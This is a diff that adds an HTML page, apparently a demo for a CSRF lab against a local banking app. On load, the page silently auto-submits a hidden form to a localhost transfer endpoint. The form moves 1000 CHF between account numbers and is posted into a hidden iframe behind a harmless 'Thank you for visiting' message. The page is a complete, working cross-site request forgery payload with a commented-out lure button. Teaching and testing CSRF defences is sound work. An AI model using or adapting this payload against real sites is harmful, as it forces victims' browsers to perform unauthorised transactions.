@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+</head>
+<body onload="document.forms.item(0).submit(); document.getElementById('h3').innerText='Your CSRF request has been successfully sent.'">
+<h2 class="hello-title">Thank you for visiting this page.</h2><h3 id="h3"></h3>
+<form action="http://localhost:8080/doTransfer" method="post" target="hiddenFrame" id="csrfTransferForm">
+    <input name="fromAccountNo" type="hidden" value="1-123456-01">
+    <input name="toAccountNo" type="hidden" value="1-123456-07">
+    <input name="amount" type="hidden" value="1000">
+    <input name="currency" type="hidden" value="CHF">
+    <input name="comment" type="hidden" value="You have been CSRF-d!">
+<!--    <input type="submit" value="CLICK HERE and win Millions $$$!" />-->
+</form>
+<iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+</html>
